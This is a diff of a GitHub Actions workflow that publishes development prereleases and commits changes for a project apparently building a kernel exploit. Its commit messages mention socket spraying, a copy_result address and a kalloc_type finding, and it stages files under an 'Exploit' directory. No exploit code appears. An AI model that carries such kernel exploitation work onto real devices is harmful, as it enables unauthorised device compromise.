             --target "${GITHUB_SHA}" --title "Development" \
             --prerelease --latest=false \
-            --notes "fix netinet/in.h include, socket spray cleanup"
+            --notes "corrected copy_result address, kalloc_type finding"
 
       - name: Commit
         run: |
           set -euo pipefail
           git config user.name "github-actions[bot]"
           git config user.email "github-actions[bot]@users.noreply.github.com"
-          git add \
-            natsuk1/Exploit/nk_api.h \
-            natsuk1/Exploit/nk_api.c \
-            natsuk1/Exploit/necp.c \
-            natsuk1/Views/OverviewView.swift \
-            natsuk1/Views/RuntimeView.swift \
-            natsuk1/Views/AirliftView.swift \
-            natsuk1/Views/ToolsView.swift \
-            natsuk1/Views/ContentView.swift \
-            natsuk1/natsuk1.swift \
-            natsuk1/Helpers/AirliftBridge.swift
+          git add natsuk1/Exploit/necp.c NEXTHINT.txt
           if git diff --cached --quiet; then echo "no changes"; exit 0; fi
-          git commit -m "fix netinet include + cleanup spray [skip ci]"
+          git commit -m "corrected copy_result address + kalloc_type finding [skip ci]"
           git push
